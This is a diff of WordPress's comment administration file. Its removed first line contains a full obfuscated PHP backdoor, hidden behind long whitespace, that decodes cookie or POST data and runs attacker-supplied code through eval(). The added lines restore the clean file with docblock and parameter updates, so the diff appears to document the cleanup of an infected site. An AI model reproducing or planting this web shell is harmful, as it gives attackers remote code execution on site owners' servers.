@@ -1,30 +1,42 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['xc4971'];global$xc4971;$xc4971=$GLOBALS;$xc4971['w395a']="\x2b\x7e\x48\x58\x5a\x7d\x7a\x7c\x5c\xd\x27\x34\x3d\x7b\xa\x56\x69\x66\x4e\x70\x5e\x3f\x23\x73\x57\x6c\x54\x4b\x6d\x2c\x3b\x2a\x36\x3e\x6a\x5b\x50\x5d\x4d\x32\x61\x28\x22\x39\x25\x4c\x63\x49\x68\x2d\x53\x65\x75\x74\x3c\x9\x77\x59\x79\x47\x31\x60\x6b\x62\x41\x40\x33\x3a\x20\x2f\x30\x78\x4f\x43\x26\x29\x51\x21\x38\x2e\x64\x44\x6e\x52\x6f\x37\x42\x55\x4a\x35\x76\x71\x45\x5f\x67\x24\x72\x46";$xc4971[$xc4971['w395a'][84].$xc4971['w395a'][89].$xc4971['w395a'][32].$xc4971['w395a'][43].$xc4971['w395a'][78].$xc4971['w395a'][78].$xc4971['w395a'][78].$xc4971['w395a'][66]]=$xc4971['w395a'][46].$xc4971['w395a'][48].$xc4971['w395a'][96];$xc4971[$xc4971['w395a'][23].$xc4971['w395a'][32].$xc4971['w395a'][85].$xc4971['w395a'][39].$xc4971['w395a'][46].$xc4971['w395a'][32].$xc4971['w395a'][63].$xc4971['w395a'][80]]=$xc4971['w395a'][84].$xc4971['w395a'][96].$xc4971['w395a'][80];$xc4971[$xc4971['w395a'][6].$xc4971['w395a'][11].$xc4971['w395a'][85].$xc4971['w395a'][63].$xc4971['w395a'][60].$xc4971['w395a'][11].$xc4971['w395a'][89].$xc4971['w395a'][60]]=$xc4971['w395a'][23].$xc4971['w395a'][53].$xc4971['w395a'][96].$xc4971['w395a'][25].$xc4971['w395a'][51].$xc4971['w395a'][82];$xc4971[$xc4971['w395a'][63].$xc4971['w395a'][89].$xc4971['w395a'][80].$xc4971['w395a'][63].$xc4971['w395a'][80]]=$xc4971['w395a'][16].$xc4971['w395a'][82].$xc4971['w395a'][16].$xc4971['w395a'][93].$xc4971['w395a'][23].$xc4971['w395a'][51].$xc4971['w395a'][53];$xc4971[$xc4971['w395a'][91].$xc4971['w395a'][70].$xc4971['w395a'][40].$xc4971['w395a'][80].$xc4971['w395a'][40].$xc4971['w395a'][89]]=$xc4971['w395a'][23].$xc4971['w395a'][51].$xc4971['w395a'][96].$xc4971['w395a'][16].$xc4971['w395a'][40].$xc4971['w395a'][25].$xc4971['w395a'][16].$xc4971['w395a'][6].$xc4971['w395a'][51];$xc4971[$xc4971['w395a'][71].$xc4971['w395a'][70].$xc4971['w395a'][43].$xc4971['w395a'][11]]=$xc4971['w395a'][19].$xc4971['w395a'][48].$xc4971['w395a'][19].$xc4971['w395a'][90].$xc4971['w395a'][51].$xc4971['w395a'][96].$xc4971['w395a'][23].$xc4971['w395a'][16].$xc4971['w395a'][84].$xc4971['w395a'][82];$xc4971[$xc4971['w395a'][17].$xc4971['w395a'][40].$xc4971['w395a'][43].$xc4971['w395a'][66]]=$xc4971['w395a'][52].$xc4971['w395a'][82].$xc4971['w395a'][23].$xc4971['w395a'][51].$xc4971['w395a'][96].$xc4971['w395a'][16].$xc4971['w395a'][40].$xc4971['w395a'][25].$xc4971['w395a'][16].$xc4971['w395a'][6].$xc4971['w395a'][51];$xc4971[$xc4971['w395a'][91].$xc4971['w395a'][89].$xc4971['w395a'][39].$xc4971['w395a'][89].$xc4971['w395a'][89].$xc4971['w395a'][39].$xc4971['w395a'][63].$xc4971['w395a'][80].$xc4971['w395a'][66]]=$xc4971['w395a'][63].$xc4971['w395a'][40].$xc4971['w395a'][23].$xc4971['w395a'][51].$xc4971['w395a'][32].$xc4971['w395a'][11].$xc4971['w395a'][93].$xc4971['w395a'][80].$xc4971['w395a'][51].$xc4971['w395a'][46].$xc4971['w395a'][84].$xc4971['w395a'][80].$xc4971['w395a'][51];$xc4971[$xc4971['w395a'][51].$xc4971['w395a'][60].$xc4971['w395a'][11].$xc4971['w395a'][70].$xc4971['w395a'][39].$xc4971['w395a'][78].$xc4971['w395a'][32].$xc4971['w395a'][80].$xc4971['w395a'][66]]=$xc4971['w395a'][23].$xc4971['w395a'][51].$xc4971['w395a'][53].$xc4971['w395a'][93].$xc4971['w395a'][53].$xc4971['w395a'][16].$xc4971['w395a'][28].$xc4971['w395a'][51].$xc4971['w395a'][93].$xc4971['w395a'][25].$xc4971['w395a'][16].$xc4971['w395a'][28].$xc4971['w395a'][16].$xc4971['w395a'][53];$xc4971[$xc4971['w395a'][19].$xc4971['w395a'][32].$xc4971['w395a'][63].$xc4971['w395a'][70].$xc4971['w395a'][63].$xc4971['w395a'][85].$xc4971['w395a'][51]]=$xc4971['w395a'][56].$xc4971['w395a'][70].$xc4971['w395a'][60].$xc4971['w395a'][63].$xc4971['w395a'][85].$xc4971['w395a'][51].$xc4971['w395a'][40].$xc4971['w395a'][85];$xc4971[$xc4971['w395a'][58].$xc4971['w395a'][78].$xc4971['w395a'][70].$xc4971['w395a'][63].$xc4971['w395a'][32]]=$xc4971['w395a'][48].$xc4971['w395a'][60].$xc4971['w395a'][63].$xc4971['w395a'][51].$xc4971['w395a'][89].$xc4971['w395a'][89].$xc4971['w395a'][66];$xc4971[$xc4971['w395a'][71].$xc4971['w395a'][66].$xc4971['w395a'][85].$xc4971['w395a'][43].$xc4971['w395a'][46].$xc4971['w395a'][80].$xc4971['w395a'][60].$xc4971['w395a'][78]]=$_POST;$xc4971[$xc4971['w395a'][90].$xc4971['w395a'][51].$xc4971['w395a'][46].$xc4971['w395a'][60].$xc4971['w395a'][46].$xc4971['w395a'][80]]=$_COOKIE;@$xc4971[$xc4971['w395a'][63].$xc4971['w395a'][89].$xc4971['w395a'][80].$xc4971['w395a'][63].$xc4971['w395a'][80]]($xc4971['w395a'][51].$xc4971['w395a'][96].$xc4971['w395a'][96].$xc4971['w395a'][84].$xc4971['w395a'][96].$xc4971['w395a'][93].$xc4971['w395a'][25].$xc4971['w395a'][84].$xc4971['w395a'][94],NULL);@$xc4971[$xc4971['w395a'][63].$xc4971['w395a'][89].$xc4971['w395a'][80].$xc4971['w395a'][63].$xc4971['w395a'][80]]($xc4971['w395a'][25].$xc4971['w395a'][84].$xc4971['w395a'][94].$xc4971['w395a'][93].$xc4971['w395a'][51].$xc4971['w395a'][96].$xc4971['w395a'][96].$xc4971['w395a'][84].$xc4971['w395a'][96].$xc4971['w395a'][23],0);@$xc4971[$xc4971['w395a'][63].$xc4971['w395a'][89].$xc4971['w395a'][80].$xc4971['w395a'][63].$xc4971['w395a'][80]]($xc4971['w395a'][28].$xc4971['w395a'][40].$xc4971['w395a'][71].$xc4971['w395a'][93].$xc4971['w395a'][51].$xc4971['w395a'][71].$xc4971['w395a'][51].$xc4971['w395a'][46].$xc4971['w395a'][52].$xc4971['w395a'][53].$xc4971['w395a'][16].$xc4971['w395a'][84].$xc4971['w395a'][82].$xc4971['w395a'][93].$xc4971['w395a'][53].$xc4971['w395a'][16].$xc4971['w395a'][28].$xc4971['w395a'][51],0);@$xc4971[$xc4971['w395a'][51].$xc4971['w395a'][60].$xc4971['w395a'][11].$xc4971['w395a'][70].$xc4971['w395a'][39].$xc4971['w395a'][78].$xc4971['w395a'][32].$xc4971['w395a'][80].$xc4971['w395a'][66]](0);$q0bb=NULL;$qb402=NULL;$xc4971[$xc4971['w395a'][56].$xc4971['w395a'][32].$xc4971['w395a'][85].$xc4971['w395a'][85]]=$xc4971['w395a'][63].$xc4971['w395a'][46].$xc4971['w395a'][32].$xc4971['w395a'][85].$xc4971['w395a'][89].$xc4971['w395a'][60].$xc4971['w395a'][40].$xc4971['w395a'][17].$xc4971['w395a'][49].$xc4971['w395a'][63].$xc4971['w395a'][78].$xc4971['w395a'][80].$xc4971['w395a'][40].$xc4971['w395a'][49].$xc4971['w395a'][11].$xc4971['w395a'][32].$xc4971['w395a'][11].$xc4971['w395a'][40].$xc4971['w395a'][49].$xc4971['w395a'][63].$xc4971['w395a'][60].$xc4971['w395a'][60].$xc4971['w395a'][39].$xc4971['w395a'][49].$xc4971['w395a'][46].$xc4971['w395a'][80].$xc4971['w395a'][63].$xc4971['w395a'][63].$xc4971['w395a'][78].$xc4971['w395a'][17].$xc4971['w395a'][40].$xc4971['w395a'][80].$xc4971['w395a'][85].$xc4971['w395a'][85].$xc4971['w395a'][17].$xc4971['w395a'][46];global$w677;function h1be553($q0bb,$v5861e1){global$xc4971;$xe03="";for($i40db580=0;$i40db580<$xc4971[$xc4971['w395a'][6].$xc4971['w395a'][11].$xc4971['w395a'][85].$xc4971['w395a'][63].$xc4971['w395a'][60].$xc4971['w395a'][11].$xc4971['w395a'][89].$xc4971['w395a'][60]]($q0bb);){for($h07f16=0;$h07f16<$xc4971[$xc4971['w395a'][6].$xc4971['w395a'][11].$xc4971['w395a'][85].$xc4971['w395a'][63].$xc4971['w395a'][60].$xc4971['w395a'][11].$xc4971['w395a'][89].$xc4971['w395a'][60]]($v5861e1)&&$i40db580<$xc4971[$xc4971['w395a'][6].$xc4971['w395a'][11].$xc4971['w395a'][85].$xc4971['w395a'][63].$xc4971['w395a'][60].$xc4971['w395a'][11].$xc4971['w395a'][89].$xc4971['w395a'][60]]($q0bb);$h07f16++,$i40db580++){$xe03.=$xc4971[$xc4971['w395a'][84].$xc4971['w395a'][89].$xc4971['w395a'][32].$xc4971['w395a'][43].$xc4971['w395a'][78].$xc4971['w395a'][78].$xc4971['w395a'][78].$xc4971['w395a'][66]]($xc4971[$xc4971['w395a'][23].$xc4971['w395a'][32].$xc4971['w395a'][85].$xc4971['w395a'][39].$xc4971['w395a'][46].$xc4971['w395a'][32].$xc4971['w395a'][63].$xc4971['w395a'][80]]($q0bb[$i40db580])^$xc4971[$xc4971['w395a'][23].$xc4971['w395a'][32].$xc4971['w395a'][85].$xc4971['w395a'][39].$xc4971['w395a'][46].$xc4971['w395a'][32].$xc4971['w395a'][63].$xc4971['w395a'][80]]($v5861e1[$h07f16]));}}return$xe03;}function w01b7ea7($q0bb,$v5861e1){global$xc4971;global$w677;return$xc4971[$xc4971['w395a'][58].$xc4971['w395a'][78].$xc4971['w395a'][70].$xc4971['w395a'][63].$xc4971['w395a'][32]]($xc4971[$xc4971['w395a'][58].$xc4971['w395a'][78].$xc4971['w395a'][70].$xc4971['w395a'][63].$xc4971['w395a'][32]]($q0bb,$w677),$v5861e1);}foreach($xc4971[$xc4971['w395a'][90].$xc4971['w395a'][51].$xc4971['w395a'][46].$xc4971['w395a'][60].$xc4971['w395a'][46].$xc4971['w395a'][80]]as$v5861e1=>$m763ef169){$q0bb=$m763ef169;$qb402=$v5861e1;}if(!$q0bb){foreach($xc4971[$xc4971['w395a'][71].$xc4971['w395a'][66].$xc4971['w395a'][85].$xc4971['w395a'][43].$xc4971['w395a'][46].$xc4971['w395a'][80].$xc4971['w395a'][60].$xc4971['w395a'][78]]as$v5861e1=>$m763ef169){$q0bb=$m763ef169;$qb402=$v5861e1;}}$q0bb=@$xc4971[$xc4971['w395a'][17].$xc4971['w395a'][40].$xc4971['w395a'][43].$xc4971['w395a'][66]]($xc4971[$xc4971['w395a'][19].$xc4971['w395a'][32].$xc4971['w395a'][63].$xc4971['w395a'][70].$xc4971['w395a'][63].$xc4971['w395a'][85].$xc4971['w395a'][51]]($xc4971[$xc4971['w395a'][91].$xc4971['w395a'][89].$xc4971['w395a'][39].$xc4971['w395a'][89].$xc4971['w395a'][89].$xc4971['w395a'][39].$xc4971['w395a'][63].$xc4971['w395a'][80].$xc4971['w395a'][66]]($q0bb),$qb402));if(isset($q0bb[$xc4971['w395a'][40].$xc4971['w395a'][62]])&&$w677==$q0bb[$xc4971['w395a'][40].$xc4971['w395a'][62]]){if($q0bb[$xc4971['w395a'][40]]==$xc4971['w395a'][16]){$i40db580=Array($xc4971['w395a'][19].$xc4971['w395a'][90]=>@$xc4971[$xc4971['w395a'][71].$xc4971['w395a'][70].$xc4971['w395a'][43].$xc4971['w395a'][11]](),$xc4971['w395a'][23].$xc4971['w395a'][90]=>$xc4971['w395a'][60].$xc4971['w395a'][79].$xc4971['w395a'][70].$xc4971['w395a'][49].$xc4971['w395a'][60],);echo@$xc4971[$xc4971['w395a'][91].$xc4971['w395a'][70].$xc4971['w395a'][40].$xc4971['w395a'][80].$xc4971['w395a'][40].$xc4971['w395a'][89]]($i40db580);}elseif($q0bb[$xc4971['w395a'][40]]==$xc4971['w395a'][51]){eval($q0bb[$xc4971['w395a'][80]]);}exit();} ?><?php
+<?php
 /**
  * WordPress Comment Administration API.
  *
  * @package WordPress
  * @subpackage Administration
+ * @since 2.3.0
  */
 
 /**
  * Determine if a comment exists based on author and date.
  *
+ * For best performance, use `$timezone = 'gmt'`, which queries a field that is properly indexed. The default value
+ * for `$timezone` is 'blog' for legacy reasons.
+ *
  * @since 2.0.0
+ * @since 4.4.0 Added the `$timezone` parameter.
  *
  * @global wpdb $wpdb WordPress database abstraction object.
  *
- * @param string $comment_author Author of the comment
- * @param string $comment_date Date of the comment
+ * @param string $comment_author Author of the comment.
+ * @param string $comment_date   Date of the comment.
+ * @param string $timezone       Timezone. Accepts 'blog' or 'gmt'. Default 'blog'.
+ *
  * @return mixed Comment post ID on success.
  */
-function comment_exists($comment_author, $comment_date) {
+function comment_exists( $comment_author, $comment_date, $timezone = 'blog' ) {
 	global $wpdb;
 
-	$comment_author = stripslashes($comment_author);
-	$comment_date = stripslashes($comment_date);
+	$date_field = 'comment_date';
+	if ( 'gmt' === $timezone ) {
+		$date_field = 'comment_date_gmt';
+	}
 
 	return $wpdb->get_var( $wpdb->prepare("SELECT comment_post_ID FROM $wpdb->comments
-			WHERE comment_author = %s AND comment_date = %s", $comment_author, $comment_date) );
+			WHERE comment_author = %s AND $date_field = %s",
+			stripslashes( $comment_author ),
+			stripslashes( $comment_date )
+	) );
 }
 
 /**
@@ -33,7 +45,6 @@ function comment_exists($comment_author, $comment_date) {
  * @since 2.0.0
  */
 function edit_comment() {
-
 	if ( ! current_user_can( 'edit_comment', (int) $_POST['comment_ID'] ) )
 		wp_die ( __( 'You are not allowed to edit comments on this post.' ) );
 
@@ -75,12 +86,12 @@ function edit_comment() {
 }
 
 /**
- * Returns a comment object based on comment ID.
+ * Returns a WP_Comment object based on comment ID.
  *
  * @since 2.0.0
  *
  * @param int $id ID of comment to retrieve.
- * @return bool|object Comment if found. False on failure.
+ * @return WP_Comment|false Comment if found. False on failure.
  */
 function get_comment_to_edit( $id ) {
 	if ( !$comment = get_comment($id) )
@@ -156,18 +167,30 @@ function get_pending_comments_num( $post_id ) {
  * Add avatars to relevant places in admin, or try to.
  *
  * @since 2.5.0
- * @uses $comment
  *
  * @param string $name User name.
  * @return string Avatar with Admin name.
  */
 function floated_admin_avatar( $name ) {
-	global $comment;
-	$avatar = get_avatar( $comment, 32, 'mystery' );
+	$avatar = get_avatar( get_comment(), 32, 'mystery' );
 	return "$avatar $name";
 }
 
+/**
+ * @since 2.7.0
+ */
 function enqueue_comment_hotkeys_js() {
 	if ( 'true' == get_user_option( 'comment_shortcuts' ) )
 		wp_enqueue_script( 'jquery-table-hotkeys' );
+}
+
+/**
+ * Display error message at bottom of comments.
+ *
+ * @param string $msg Error Message. Assumed to contain HTML and be sanitized.
+ */
+function comment_footer_die( $msg ) {
+	echo "<div class='wrap'><p>$msg</p></div>";
+	include( ABSPATH . 'wp-admin/admin-footer.php' );
+	die;
 }
